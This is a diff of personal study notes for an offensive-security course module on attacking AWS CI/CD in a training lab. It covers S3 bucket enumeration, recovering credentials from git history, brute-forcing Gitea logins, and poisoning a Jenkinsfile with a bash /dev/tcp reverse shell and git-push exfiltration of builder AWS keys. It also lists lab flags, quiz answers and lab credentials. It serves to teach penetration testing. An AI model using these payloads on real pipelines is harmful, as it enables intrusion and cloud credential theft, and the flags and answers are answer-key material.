@@ -1,307 +1,295 @@
-# Attacking AWS Cloud Infrastructure
+# Attacking AWS Cloud Infrastructure (Module 26)
 
-**Module 26** | ← [[Enumerating AWS Cloud Infrastructure]]
+#CICD #AWS #DependencyConfusion #Meterpreter #Jenkins #S3 #Terraform #CloudPrivEsc #PythonPayload #NetworkPivot #SOCKSProxy #PortForwarding #PoisonedPipeline #GitLeaks #IAM #EC2
 
-Tags: #Module26 #AWS #CICD #PipelinePoisoning #DependencyChain #Jenkins #Gitea #S3 #Python #Terraform #CloudSecurity
-
-## Overview
-
-Two completely separate attack chains, each with its own lab environment.
-
-**Part 1 — Leaked Secrets to Poisoned Pipeline**
-Misconfigured S3 bucket exposes a full git repository. Git history contains hardcoded admin credentials (base64 basic auth header). Admin Gitea access lets us edit a Jenkins pipeline definition. Poisoned Jenkinsfile yields a reverse shell on the build server, with AWS credentials in env vars. Create backdoor IAM user for persistent full admin access.
-
-**Part 2 — Dependency Chain Abuse**
-OSINT finds a forum post referencing a private Python package not on the public registry. Publishing a higher-versioned malicious package causes pip's `extra-index-url` confusion: production pulls ours instead of the private one. Production shell leads to internal network pivot via netscan.py, Jenkins discovery, S3 Explorer plugin credential leak, then Terraform state file with admin AWS keys.
+**Part 2 (Dependency Chain Abuse, 26.7-26.10): fully done — all labs, all flags.** Part 1 (Leaked Secrets to Poisoned Pipeline, 26.2-26.6): theory done, hands-on labs pending — marked inline.
 
 ---
 
-## OWASP CI/CD Top 10
+## Outstanding Sections
 
-| ID | Risk | Relevance |
-|----|------|-----------|
-| CICD-SEC-1 | Insufficient Flow Control | Background |
-| CICD-SEC-2 | Inadequate IAM | Background |
-| CICD-SEC-3 | Dependency Chain Abuse | Part 2 main attack |
-| CICD-SEC-4 | Poisoned Pipeline Execution (PPE) | Part 1 main attack |
-| CICD-SEC-5 | Insufficient PBAC | Both parts |
-| CICD-SEC-6 | Insufficient Credential Hygiene | Part 1 (git history creds) |
-| CICD-SEC-7 | Insecure System Configuration | Part 2 (Jenkins plugin) |
-| CICD-SEC-8 | Ungoverned 3rd Party Services | Not covered (needs GitHub) |
-| CICD-SEC-9 | Improper Artifact Integrity Validation | Part 2 (no package signing) |
-| CICD-SEC-10 | Insufficient Logging/Visibility | Not covered (manual) |
-
-> 📸 Screenshot: OWASP CI/CD Top 10 overview diagram
+- [x] 26.1 About the Public Cloud Labs
+- [x] 26.2 Lab Design
+- [x] 26.3 Enumeration (theory + MSF quiz Qs done; dir-bust and brute-force labs pending)
+- [x] 26.4 Discovering Secrets (theory done; git-history flag labs pending)
+- [x] 26.5 Poisoning the Pipeline (theory done; shell + env var labs pending)
+- [x] 26.6 Compromising the Environment via Backdoor Account (theory done; EC2 tag lab pending)
+- [x] 26.7 Dependency Chain Abuse
+- [x] 26.8 Information Gathering (theory done; public app flag labs pending)
+- [x] 26.9 Dependency Chain Attack
+- [x] 26.10 Compromising the Environment
+- [x] 26.11 Wrapping Up
 
 ---
 
-## Part 1: Leaked Secrets to Poisoned Pipeline
+## 26.1 About the Public Cloud Labs
 
-### 26.2. Lab Design
+These labs use OffSec's Public Cloud Labs (not VPN-based). You interact with live AWS infrastructure over the internet. Each lab session provides a fresh DNS IP, cloud Kali IP, and Kali password. Progress is NOT saved between sessions.
 
-Lab ID: `aws/attacking-cicd/scenario1`
+> 📸 Screenshot: Lab start screen showing DNS IP, Kali IP, and password fields
 
-| Component | URL |
-|-----------|-----|
+Key constraints:
+- Session runs up to 1 hour before prompting to extend (max 10 hours)
+- Lab state resets on restart — note every command you ran
+- AWS labs are NOT accessible through In-Browser Kali — use the provided cloud Kali or your own Kali
+
+---
+
+## 26.2 Lab Design
+
+Two separate attack scenarios in this module:
+
+**Scenario 1: Leaked Secrets to Poisoned Pipeline** (sections 26.3-26.6) — exploits public S3 misconfiguration → Git credentials → Jenkins PPE → AWS key theft  
+**Scenario 2: Dependency Chain Abuse** (sections 26.7-26.10) — exploits private package registry → meterpreter in production container → Jenkins → Terraform state → admin
+
+Lab components (both scenarios share the same subdomain set):
+
+| Component | Subdomain |
+|---|---|
 | Gitea (SCM) | `git.offseclab.io` |
 | Jenkins (automation) | `automation.offseclab.io` |
-| App | `app.offseclab.io` |
+| Application | `app.offseclab.io` |
+| PyPI mirror (Scenario 2 only) | `pypi.offseclab.io` |
 
-Lab also provides: custom DNS IP, cloud Kali IP, cloud Kali SSH password.
+### DNS Setup (Personal Kali)
 
-**Lab notes:** State does not persist. Lab prompts after 1 hour idle, extends up to 10 hours. DNS IP changes on every restart.
-
-#### DNS setup (run at every lab start)
+The lab provides a DNS server IP. Module recommends `nmcli` but that restarts NetworkManager. Safer approach: `/etc/hosts`.
 
 ```bash
+# Module's recommended method (restart-heavy)
 sudo nmcli connection modify "Wired connection 1" ipv4.dns "<DNS_IP>"
 sudo systemctl restart NetworkManager
-cat /etc/resolv.conf          # verify nameserver line shows DNS_IP
-nslookup git.offseclab.io     # verify it resolves to a real IP
+# Undo at end: same command with "" instead of IP
+
+# Safer for lab use: resolve then /etc/hosts
+nslookup git.offseclab.io <DNS_IP>
+echo "<resolved_ip> git.offseclab.io" | sudo tee -a /etc/hosts
 ```
 
-You can also add fallback resolvers in a comma-separated list: `"<DNS_IP>, 1.1.1.1"`.
+> 🔧 Technique: nmcli DNS changes + NetworkManager restart can break VPN connections. If you're on VPN for other modules, use /etc/hosts instead. Remove entries when the lab session ends.
 
-#### DNS cleanup (run at lab end)
+### pip Config (Scenario 2 only)
 
 ```bash
-sudo nmcli connection modify "Wired connection 1" ipv4.dns ""
-sudo systemctl restart NetworkManager
+mkdir -p ~/.config/pip/
+cat > ~/.config/pip/pip.conf << 'EOF'
+[global]
+index-url = http://pypi.offseclab.io
+trusted-host = pypi.offseclab.io
+EOF
 ```
+
+Also needed on cloud Kali (for twine uploads). Clean up after the lab: `rm ~/.config/pip/pip.conf && rm ~/.pypirc`.
 
 ---
 
-### 26.3. Enumeration
+## 26.3 Enumeration (Scenario 1)
 
-#### 26.3.1. Enumerating Jenkins
+### 26.3.1 Enumerating Jenkins
 
-Jenkins is at the root path, not `/jenkins/`. Fingerprint version without credentials using Metasploit:
+Jenkins at `automation.offseclab.io`. Homepage redirects to login — self-registration disabled here (Scenario 1 public-facing). Use MSF to grab version without credentials:
 
 ```bash
-sudo msfdb init
-msfconsole --quiet
-```
-
-In MSF:
-```
+msfdb init
+msfconsole -q
 use auxiliary/scanner/http/jenkins_enum
 set RHOSTS automation.offseclab.io
-set TARGETURI /        # root, not /jenkins/
+set TARGETURI /     # root, not /jenkins/
 run
 ```
 
-Expected output: Jenkins version + 403 on all restricted endpoints (auth required). Version alone is useful for public exploit search.
-
-> 🔍 Worth remembering generally: `TARGETURI` defaults to `/jenkins/` in this module. Jenkins is actually at `/`. Always check root vs. sub-path when a scanner returns minimal results.
-
-**Quiz answers (pure recall):**
-- Q2: `C, jenkins_enum`
-- Q3: `A, To specify the root directory of Jenkins`
-
-> 🚩 Hands-on, VM spin-up required: Run a directory busting attack on `automation.offseclab.io` to find the hidden endpoint that returns a flag. ✅ Done
-
-**Gotcha — wildcard 403s and the Caddy layer.** Jenkins returns 403 (not 404) for ALL paths, including non-existent ones. The 403 body includes the path itself, so every false-positive has a different size — `--exclude-length` only clears one specific size. Fix: use `-b 403,404` to blacklist the status codes entirely and only surface real hits. Also: `Server: Caddy` shows in headers — there's a reverse proxy in front of Jenkins that can have its own routes independent of Jenkins (that's where the flag endpoint lived).
-
-`robots.txt` returned during a common.txt scan:
+Expected output:
 ```
-# we don't want robots to click "build" links
-User-agent: *
-Disallow: /%
+[+] 198.18.x.x:80 - Jenkins Version 2.385
+[*] /script restricted (403)
+[*] /view/All/newJob restricted (403)
 ```
 
-Switched to SecLists `raft-medium-words.txt` with status-code blacklisting:
-```bash
-gobuster dir -u http://automation.offseclab.io \
-  -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt \
-  -b 403,404 -t 50
-```
+> 📸 Screenshot: jenkins_enum output showing version + 403s
 
-Found `/help_answer` (Status: 200, Size: 44):
-```bash
-curl http://automation.offseclab.io/help_answer
-OS{ceed5131f8e7896442f018222cae85989e4b40d2}
-```
+> 🔍 Worth remembering generally: `jenkins_enum` only gets version when authentication is required, since everything else returns 403. Still useful — version lets you search public exploits. Note the version for later when you have credentials.
 
-#### 26.3.2. Enumerating the Git Server
+- [ippsec.rocks — search "jenkins"](https://ippsec.rocks/?#jenkins) → Jeeves (HTB) has the Groovy script console exploit; Doctor (HTB) covers Werkzeug/Python apps behind a similar setup
+- [HackTricks — Jenkins (GitHub)](https://github.com/HackTricks-wiki/hacktricks/blob/master/pentesting-cicd/jenkins/)
 
-Visit `git.offseclab.io`. Click **Explore**. Without credentials:
-- **Repositories tab:** empty (repos are private)
-- **Users tab:** five accounts: Billy, Jack, Lucy, Roger, administrator
-- **Version:** shown at bottom of page
+Quiz answers:
+- Q: Which MSF module? → **C) jenkins_enum**
+- Q: Why TARGETURI = "/"? → **A) To specify the root directory of Jenkins**
 
-Key insight: self-hosted SCMs expose user lists by default even without auth. Hosted SCMs (GitHub, GitLab) have too many unrelated users for this to be useful.
+> 🚩 Hands-on, VM spin-up required: Run a directory busting attack on Jenkins to find the hidden endpoint with a flag. ⬜ Pending
 
-**Quiz answers (pure recall):**
-- Q2: `B. Enumerating public repositories and users (hosted SCMs = OSINT focus, not brute force of accounts)`
-- Q3: `B, The repositories are private`
+### 26.3.2 Enumerating the Git Server
 
-> 🚩 Hands-on, VM spin-up required: Brute force the five discovered users to find the one with a weak password. ✅ Done
-
-Endpoint: `http://git.offseclab.io/api/v1/user`, returns 200 on valid Basic Auth, 401 on failure. Start with Billy (lab hint):
+Gitea at `git.offseclab.io`. Approach depends on hosted vs self-hosted SCM. For self-hosted: enumerate exposed repos and users; brute forcing is in scope. For hosted (GitHub/GitLab): stick to OSINT on public repos only.
 
 ```bash
-wfuzz -c -z file,/usr/share/wordlists/rockyou.txt --basic "billy:FUZZ" \
-  -u http://git.offseclab.io/api/v1/user --hc 401
+# Check public users on Gitea (click Explore → Users)
+# Found: Billy, Jack, Lucy, Roger, administrator
 ```
 
-Hit on request 20: **billy:qwerty**. Confirmed with curl, authenticated JSON user object returned, `is_admin: false`.
+> 📸 Screenshot: Gitea Explore → Users tab showing 5 users
 
-#### 26.3.3. Enumerating the Application
+Private repos won't show in the Repositories tab — but their existence is confirmed by the empty list. User enumeration gives targets for brute force.
+
+```bash
+# Brute force with hydra (self-hosted SCM is in scope)
+hydra -L /usr/share/wordlists/metasploit/unix_users.txt \
+      -P /usr/share/wordlists/rockyou.txt \
+      git.offseclab.io http-post-form \
+      "/user/login:_csrf=^CSRF^&user_name=^USER^&password=^PASS^&remember=on:Username or password is incorrect"
+```
+
+Quiz answers:
+- Q: Hosted SCM focus? → **B) Enumerating public repositories and users**
+- Q: Repos tab empty? → **B) The repositories are private**
+
+> 🚩 Hands-on, VM spin-up required: Brute force the users found in the SCM server and find the user with a weak password. ⬜ Pending
+
+### 26.3.3 Enumerating the Application
+
+App at `app.offseclab.io`. Quick dirb finds nothing. View Page Source is the key:
 
 ```bash
 dirb http://app.offseclab.io
-# Finds nothing useful
+# Nothing useful found
+
+# Right-click → View Page Source in Firefox
+# Search for "s3.amazonaws.com"
 ```
 
-View page source instead. Key find: S3 bucket URLs in `<img src="...">` tags:
-```
-https://staticcontent-<SUFFIX>.s3.us-east-1.amazonaws.com/images/bunny.jpg
-```
+In the source you find `<img src="https://staticcontent-<random>.s3.us-east-1.amazonaws.com/images/bunny.jpg">`. The bucket name is embedded in the HTML.
 
-Test bucket root listing:
+Test if the bucket is publicly listable:
 ```bash
-curl https://staticcontent-<SUFFIX>.s3.us-east-1.amazonaws.com
-# Returns: <Error><Code>AccessDenied</Code>...
-# Bucket-level listing blocked
+# curl the root of the bucket (no trailing slash = XML response)
+curl https://staticcontent-<bucket>.s3.us-east-1.amazonaws.com
+# AccessDenied = not publicly listable
+
+# Try with AWS CLI (AuthenticatedUsers misconfiguration — any AWS account can access)
+aws configure   # use the IAM account provided with the lab
+aws s3 ls staticcontent-<bucket>
+# Lists: .git/ images/ scripts/ webroot/ Jenkinsfile README.md docker-compose.yml
 ```
 
-Test with dirb (first 50 entries of common.txt):
-```bash
-head -n 51 /usr/share/wordlists/dirb/common.txt > first50.txt
-dirb https://staticcontent-<SUFFIX>.s3.us-east-1.amazonaws.com ./first50.txt
-# Finds: /.git/HEAD (CODE:200) = full git repo in bucket
-```
+> 🔍 Worth remembering generally: The S3 `AuthenticatedUsers` ACL means ANY authenticated AWS user, even in a different account. Many admins confuse this with "authenticated users in OUR account." It's the bucket policy misconfiguration that exposes git repos, CI configs, and scripts to the world.
 
-Test with AWS CLI (cross-account authenticated listing):
-```bash
-aws configure    # use lab-provided IAM creds, region us-east-1
-aws s3 ls staticcontent-<SUFFIX>
-# Lists: .git/, images/, scripts/, webroot/, Jenkinsfile, README.md, etc.
-```
+- [HackTricks — AWS S3 Attacks (GitHub)](https://github.com/HackTricks-wiki/hacktricks/blob/master/pentesting-cloud/aws-security/aws-services/aws-s3-athena-glue-emr-and-other-storage-attacks.md)
 
-Why this works: S3's "AuthenticatedUsers" ACL is widely misunderstood. Admins think it means "users in my account" but it actually means "any authenticated AWS user in any account." A free personal AWS account is enough to exploit this.
+Quiz answers:
+- Q: Useful info in HTML source? → **C) The use of S3 buckets for storing images**
+- Q: Command to list S3 bucket? → **B) aws s3 ls**
 
-> 🔍 Worth remembering generally: S3 bucket-level ACL blocking public access and object-level access are separate controls. An object can be readable by any AWS-authenticated user even if the bucket appears "private" to unauthenticated requests.
-
-> 🔁 Similar to: [[Enumerating AWS Cloud Infrastructure#25.2. Cloud Storage Enumeration|Module 25 S3 enumeration]], same cross-account listing bypass pattern
-
-**Quiz answers (pure recall):**
-- Q2: `C, The use of S3 buckets for storing images`
-- Q3: `B, aws s3 ls`
-
-> 🚩 Hands-on, VM spin-up required: Find the flag in the HTML source of `app.offseclab.io`. ✅ Done
-
-```bash
-curl -s http://app.offseclab.io | grep -i "flag\|OS{"
-# <p hidden>OS{5196fd9c2e4aa10c93f04940a553c7155c7bdf70}</p>
-```
-
-Flag was in a `<p hidden>` tag, not visible in the browser but present in raw HTML source.
+> 🚩 Hands-on, VM spin-up required: Discover the flag in the HTML source of the web page. ⬜ Pending
 
 ---
 
-### 26.4. Discovering Secrets
+## 26.4 Discovering Secrets (Scenario 1)
 
-#### 26.4.1. Downloading the Bucket
+### 26.4.1 Downloading the Bucket
+
+Enumerate the bucket contents found above — note the Jenkinsfile (CI/CD indicator) and the .git directory (full git repo stored in S3):
 
 ```bash
 mkdir static_content
-aws s3 sync s3://staticcontent-<SUFFIX> ./static_content/
+aws s3 sync s3://staticcontent-<bucket> ./static_content/
 cd static_content
 ```
 
-Contents: `.git/`, `images/`, `scripts/`, `webroot/`, `Jenkinsfile`, `README.md`, `docker-compose.yml`, `Caddyfile`, `CONTRIBUTING.md`.
+Review `scripts/upload-to-s3.sh` and `scripts/update-readme.sh` for hardcoded secrets. The upload script is clean. The update-readme.sh script queries collaborators from Gitea using a Basic auth header — but the CURRENT version takes credentials as arguments:
 
-Presence of Jenkinsfile = this is a CI/CD repo.
-
-Review `scripts/update-readme.sh`: accepts `USERNAME PASSWORD` as args, calls Gitea API with a basic auth header. README names Lucy and Roger as collaborators, Jack as repo owner.
-
-**Quiz answers (pure recall):**
-- Q1: `C. Jenkinsfile`
-- Q2: `B, aws s3 sync`
-
-#### 26.4.2. Searching for Secrets in Git History
-
-Install gitleaks and run it:
 ```bash
-sudo apt update && sudo apt install -y gitleaks
-gitleaks detect
-# Output: "no leaks found"
+# Current version (cleaned up)
+auth_header=$(printf "Authorization: Basic %s\n" "$(echo -n "$username:$password" | base64)")
+USERNAMES=$(curl -X 'GET' 'http://git.offseclab.io/api/v1/repos/Jack/static_content/collaborators' -H 'accept: application/json' -H $auth_header | jq .[].username)
 ```
 
-gitleaks finds nothing. Always do a manual review of interesting commits:
+The word "Fix issue" in the git log is a red flag worth investigating.
+
+Quiz answers:
+- Q: Which file indicates CI/CD pipeline? → **C) Jenkinsfile**
+- Q: Sync command? → **B) aws s3 sync**
+
+### 26.4.2 Searching for Secrets in Git
+
+First try automated scanning:
+
+```bash
+# Install and run gitleaks
+sudo apt install -y gitleaks
+gitleaks detect      # run from root of static_content/
+# "no leaks found" — but always do a manual review
+```
+
+Manual review of git history:
 
 ```bash
 git log
-# Look for commits after "Add Management Scripts": there's a "Fix issue" commit
-git show <FIX_ISSUE_COMMIT_HASH>
+# Commits in order: Init Repo → Add images → Add index.html → add Docker →
+# Add Managment Scripts → Fix issue ← SUSPICIOUS → Add Jenkinsfile
+
+# Inspect the "Fix issue" commit
+git show <commit_hash_of_Fix_issue>
 ```
 
-The diff reveals the old version of `update-readme.sh` had a hardcoded basic auth header:
+The diff shows that the OLD version of update-readme.sh had a hardcoded auth header:
 ```
-'authorization: Basic YWRtaW5pc3RyYXRvcjo5bndrcWU1aGxiY21jOTFu'
+-USERNAMES=$(curl -X 'GET' '...collaborators' -H 'authorization: Basic YWRtaW5pc3RyYXRvcjo5bndrcWU1aGxiY21jOTFu' | jq ...)
 ```
 
-Decode it:
+Decode the credential:
 ```bash
 echo "YWRtaW5pc3RyYXRvcjo5bndrcWU1aGxiY21jOTFu" | base64 --decode
-# administrator:9nwkqe5hlbcmc91n   (will differ in your lab)
+# administrator:9nwkqe5hlbcmc91n  (will differ per lab)
 ```
 
-Log in to `git.offseclab.io` as `administrator` with the decoded password.
+Log into Gitea with `administrator:9nwkqe5hlbcmc91n` — now private repos are visible.
 
-> 🔍 Worth remembering generally: `gitleaks` checks current file contents and some obvious patterns but can miss credentials that lived in a previous version of a file and were "fixed" in a later commit. Always manually inspect commits titled "fix", "cleanup", "remove secrets", etc., especially the ones right after a credentials or scripts commit.
+> 🔍 Worth remembering generally: gitleaks misses custom formats (like a standard `Authorization: Basic` header with custom base64). Always follow automated scanning with manual `git log` + `git show` on suspicious commit messages like "Fix issue", "Remove credentials", "Clean up", "Oops".
 
-**Quiz answer (derivable from module text):**
-- Q1: `Jack` (every commit in the git log is authored by Jack)
+- [PayloadsAllTheThings — Git Recon](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Network%20Discovery.md)
 
-> 🚩 Hands-on, VM spin-up required: Find the flag embedded in one of the files in the git history. ✅ Done
+Quiz answers:
+- Q: Username who committed credentials? → **Jack**
 
-```bash
-# Sync bucket (bucket name suffix differs per lab run — get it from app.offseclab.io page source)
-mkdir static_content && aws s3 sync s3://staticcontent-<SUFFIX> ./static_content/
-cd static_content
-
-# Find which commit has the flag
-git --no-pager log -p | grep "OS{"
-
-# Decode the hardcoded credential found in the "Fix issue" diff
-echo "YWRtaW5pc3RyYXRvcjpzbTkzbzZ3MjFqamVub3A4" | base64 --decode
-# administrator:sm93o6w21jjenop8   (suffix differs per lab run)
-```
-
-The flag was added to a file in an earlier commit then removed in `2c8e53e Fix issue`. It no longer exists in the working tree, only visible in history:
-```
--OS{b866692e41bc2d0b9d38cab857f2f8ef53e8b065}
-```
-
-Flag: `OS{b866692e41bc2d0b9d38cab857f2f8ef53e8b065}`
-
-Also recovered: **administrator:sm93o6w21jjenop8** from the removed `authorization: Basic` header in the same commit. Use these to log in to `git.offseclab.io` as administrator.
+> 🚩 Hands-on, VM spin-up required: Discover the flag in one of the files in the git history. ⬜ Pending
 
 ---
 
-### 26.5. Poisoning the Pipeline
+## 26.5 Poisoning the Pipeline (Scenario 1)
 
-#### 26.5.1. Enumerating the Repositories
+### 26.5.1 Enumerating Repositories
 
-Logged in as `administrator`, click **Explore**. Private repos now visible. Open `image-transform` repo and review its Jenkinsfile:
+Logged in as `administrator`, browse to Explore → Repositories. Two repos found: `static_content` (already downloaded) and `image-transform`.
+
+The `image-transform` Jenkinsfile uses `withAWS(region:'us-east-1', credentials:'aws_key')` — this loads AWS keys (`AWS_ACCESS_KEY_ID`, `AWS_SECRET_ACCESS_KEY`, `AWS_DEFAULT_REGION`) as environment variables for every step inside the block. If we can run code inside that block, we steal the keys.
+
+Check if a webhook is configured: Settings → Webhooks → trigger = Git Push. Push to the repo = pipeline runs.
+
+> 📸 Screenshot: Gitea webhook config showing "Push" trigger pointing to Jenkins
+
+Quiz answers:
+- Q: What type of webhook is configured on image-transform? → **Gitea** (the Gitea webhook type, as opposed to Slack/Discord/Telegram)
+
+> 🚩 Hands-on, VM spin-up required: Discover the flag in the repository. ⬜ Pending
+
+### 26.5.2 Modifying the Pipeline
+
+Goal: inject a reverse shell into the Jenkinsfile that runs inside `withAWS(...)` so the shell inherits the AWS env vars.
+
+Jenkins DSL uses Groovy syntax but the `script {}` block runs in a sandboxed Groovy — limited API access. Use the `sh` step instead (from Nodes and Processes plugin, almost always installed) to run system commands:
 
 ```groovy
 pipeline {
   agent any
   stages {
-    stage('Validate Cloudfront File') {
+    stage('Send Reverse Shell') {
       steps {
-        withAWS(region:'us-east-1', credentials:'aws_key') {
-          cfnValidate(file:'image-processor-template.yml')
-        }
-      }
-    }
-    stage('Create Stack') {
-      steps {
-        withAWS(region:'us-east-1', credentials:'aws_key') {
-          cfnUpdate(stack:'image-processor-stack', file:'image-processor-template.yml', ...)
+        withAWS(region: 'us-east-1', credentials: 'aws_key') {
+          script {
+            if (isUnix()) {
+              sh 'bash -c "bash -i >& /dev/tcp/<cloud-kali-ip>/4242 0>&1" &'
+            }
+          }
         }
       }
     }
@@ -309,462 +297,283 @@ pipeline {
 }
 ```
 
-`withAWS(credentials:'aws_key')` = Jenkins AWS Steps plugin loads the named credential store entry as environment variables:
-- `AWS_ACCESS_KEY_ID`
-- `AWS_SECRET_ACCESS_KEY`
-- `AWS_DEFAULT_REGION`
-
-These will be available to any `sh` step inside the `withAWS` block. If we can run our own `sh` inside a `withAWS`, we can capture the credentials.
-
-Check webhooks: **Settings → Webhooks** in Gitea. A Git Push event fires a webhook to the automation server. Editing the Jenkinsfile and pushing will trigger a pipeline run automatically.
-
-> 📸 Screenshot: Gitea webhook settings showing trigger type and destination URL
-
-> 🚩 Hands-on, VM spin-up required: Find the flag in the `image-transform` repository. ✅ Done
-
+Test curl first before adding the shell (start apache2 on cloud Kali, watch access.log):
 ```bash
-git clone http://administrator:sm93o6w21jjenop8@git.offseclab.io/Jack/image-transform.git
-grep -r "OS{" ~/image-transform/
-# /home/kali/image-transform/README.md:OS{c63b4732a64361464f4c5ffe408f69fe6545bc8a}
-```
-
-Flag was in `README.md`: `OS{c63b4732a64361464f4c5ffe408f69fe6545bc8a}`
-
-> 🚩 Hands-on, VM spin-up required: Check the webhook type configured on the `image-transform` repo (Gitea Settings → Webhooks). ✅ Done
-
-Webhook type: **Gogs** (Gitea is a Gogs fork and uses the Gogs webhook format for backwards compatibility; the Jenkins endpoint is `/gogs-webhook/?job=<jobname>`). Confirmed via Gitea API after lab reset:
-```bash
-curl -s -u "administrator:<password>" "http://git.offseclab.io/api/v1/repos/Jack/image-transform/hooks"
-# "type": "gogs", "url": "http://automation.offseclab.io/gogs-webhook/?job=image-transform"
-```
-
-#### 26.5.2. Modifying the Pipeline
-
-The Jenkinsfile DSL is Groovy-based. The `script {}` block runs Groovy inside a sandbox that blocks most Java/internal API access. No direct process spawning from Groovy.
-
-Use `sh` from the **Nodes and Processes** plugin instead. This plugin is almost always installed (it's maintained by Jenkins itself and enables basic pipeline functionality like `dir` and `sh`).
-
-**Step 1: Verify execution with a curl callback.**
-
-Start Apache on cloud Kali first:
-```bash
-ssh kali@<CLOUD_KALI_IP>
+# Cloud Kali
 sudo systemctl start apache2
-```
 
-Poisoned Jenkinsfile (test payload):
-```groovy
-pipeline {
-  agent any
-  stages {
-    stage('Send Reverse Shell') {
-      steps {
-        withAWS(region: 'us-east-1', credentials: 'aws_key') {
-          script {
-            if (isUnix()) {
-              sh 'curl http://<CLOUD_KALI_IP>/unix'
-            }
-          }
-        }
-      }
-    }
-  }
-}
-```
+# Jenkinsfile test payload
+sh 'curl http://<cloud-kali-ip>/unix'
 
-After committing in Gitea UI, watch Apache logs on cloud Kali:
-```bash
+# Watch log
 cat /var/log/apache2/access.log
-# Expect: "GET /unix HTTP/1.1" 200 from the builder's IP
+# 198.18.x.x - "GET /unix HTTP/1.1" 404 — confirms Unix + code exec
 ```
 
-`isUnix()` is a Jenkinsfile built-in that returns true on Linux/macOS builders. Use it to avoid crashes on Windows builders.
+Then swap to the real reverse shell. Commit the Jenkinsfile via Gitea UI (Edit → paste → Commit) — this triggers the webhook → Jenkins runs the pipeline:
 
-**Step 2: Replace with reverse shell.**
-
-Start listener on cloud Kali:
 ```bash
+# Cloud Kali — start listener before committing
 nc -nvlp 4242
+# → connect from builder
+# jenkins@<container>:~/agent/workspace/image-transform$
 ```
 
-Final poisoned Jenkinsfile:
-```groovy
-pipeline {
-  agent any
-  stages {
-    stage('Send Reverse Shell') {
-      steps {
-        withAWS(region: 'us-east-1', credentials: 'aws_key') {
-          script {
-            if (isUnix()) {
-              sh 'bash -c "bash -i >& /dev/tcp/<CLOUD_KALI_IP>/4242 0>&1" &'
-            }
-          }
-        }
-      }
-    }
-  }
-}
-```
+> 📸 Screenshot: Gitea edit → Commit Changes button
+> 📸 Screenshot: nc shell from Jenkins builder, whoami = jenkins
 
-Commit in Gitea UI. Shell arrives within seconds of the pipeline starting.
+- [RevShells.com](https://www.revshells.com) — bash TCP reverse shell generator
+- [ippsec.rocks — search "jenkins groovy"](https://ippsec.rocks/?#jenkins) → Jeeves has the Groovy script console path; Bounty touches ASP.NET upload but same "modify what runs" philosophy
 
-> 🔍 Worth remembering generally: Wrapping a reverse shell in `bash -c "..."` ensures redirections work regardless of the execution context. The trailing `&` backgrounds the process so the pipeline step doesn't stall waiting for it to finish.
+> 🔍 Worth remembering generally: Groovy inside a Jenkinsfile `script {}` block is sandboxed — can't access filesystem or runtime APIs without admin approval. Always use `sh 'bash ...'` or `bat 'cmd /c ...'` to escape to a system shell instead. The `isUnix()` check is zero cost and makes payloads cross-platform.
 
-> 🔍 Worth remembering generally: Groovy `script {}` in a Jenkinsfile runs sandboxed. You cannot call Java APIs, spawn processes, or read files via Groovy directly without admin approval. Always use `sh` for OS-level commands in a Jenkinsfile.
-
-#### 26.5.3. Enumerating the Builder
-
-After shell lands (running as `jenkins` user):
+### 26.5.3 Enumerating the Builder
 
 ```bash
-uname -a                        # kernel: Amazon Linux kernel, arch x86_64
-cat /etc/os-release             # OS: Debian GNU/Linux 11 (bullseye)
-ls -a ~                         # .ssh/, agent/ (workspace snapshots)
-cat ~/.ssh/authorized_keys      # Jenkins controller SSH key present
-cat /proc/mounts                # overlay filesystem = Docker container
-cat /proc/1/status | grep Cap   # check container capability set
+uname -a
+# Linux fcd3cc360d9e 4.14.309... amzn2.x86_64 — Amazon Linux kernel
+
+cat /etc/os-release
+# PRETTY_NAME="Debian GNU/Linux 11 (bullseye)"
+
+# Confirm Docker container
+cat /proc/mounts
+# overlay on / type overlay (rw,...,lowerdir=/var/lib/docker/overlay2/...)
+# Overlay filesystem = Docker container
+
+# Check for privileged container
+cat /proc/1/status | grep Cap
+# CapPrm: 0000003fffffffff  ← decode on your Kali
 ```
 
-Decode capabilities on personal Kali:
 ```bash
+# On personal Kali
 capsh --decode=0000003fffffffff
-# cap_net_admin, cap_sys_admin present = privileged or all-caps container
-# Need root-in-container first to exploit these
+# → cap_sys_admin, cap_net_admin, etc. = privileged container
 ```
 
-Find the AWS credentials:
+The critical harvest — AWS keys are in environment variables:
 ```bash
 env | grep AWS
-# AWS_ACCESS_KEY_ID=...
-# AWS_SECRET_ACCESS_KEY=...
 # AWS_DEFAULT_REGION=us-east-1
+# AWS_SECRET_ACCESS_KEY=W4gtNvsaeVgx5278oy5AXqA9...
+# AWS_ACCESS_KEY_ID=AKIAUBHUBEGIMU2Y5GY7
 ```
 
-These are the credentials loaded by `withAWS(credentials:'aws_key')` from Jenkins' credential store.
+> 📸 Screenshot: env | grep AWS output with key values
 
-**Quiz answer (derivable from module text):**
-- Q1: `Debian GNU/Linux` (module Listing 34 shows `PRETTY_NAME="Debian GNU/Linux 11 (bullseye)"`)
+Quiz answers:
+- Q: OS in /etc/os-release? → **Debian GNU/Linux 11 (bullseye)**
 
-> 🚩 Hands-on, VM spin-up required: Find the flag in the "secret" file on the builder. ✅ Done
-
-**Gotcha — SSH to cloud Kali failed (server only offered publickey auth), local machine was behind NAT.** Used git exfiltration instead: Jenkinsfile writes loot back to the Gitea repo via `git commit && git push`, then we `git pull` to read it. No listener needed.
-
-File is named `secrets` (plural), not `secret`, `find -name "secret"` missed it. Found by grepping for `OS{` across the filesystem:
-```bash
-grep -rl "OS{" /home /etc /tmp /var /root /agent 2>/dev/null
-# /home/jenkins/secrets
-```
-
-```bash
-# Jenkinsfile payload (inside withAWS + sh block):
-printf "%s\n" "$(cat /home/jenkins/secrets)" > loot.txt
-git add loot.txt && git commit -m "loot" && git push http://administrator:<pass>@git.offseclab.io/Jack/image-transform.git HEAD:master
-```
-
-Flag from `/home/jenkins/secrets`: `OS{a8d127e69cd052378d9bd0e53521ae86c5f68258}`
-
-> 🚩 Hands-on, VM spin-up required: Find the flag in an environment variable on the builder. ✅ Done
-
-Same git exfiltration approach. Flag was in `FLAG` env var (found with `env | grep -i flag`):
-`FLAG=OS{0455af05cb5e9eee94a715e47627a020f1e810ff}`
-
-Also recovered builder AWS credentials via `env | grep AWS`:
-- `AWS_ACCESS_KEY_ID=AKIA347SY2ZX2XUUSVFI`
-- `AWS_SECRET_ACCESS_KEY=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`
+> 🚩 Hands-on, VM spin-up required: Read /etc/os-release; discover the flag in the "secret" file; discover the environment variable with the flag. ⬜ Pending
 
 ---
 
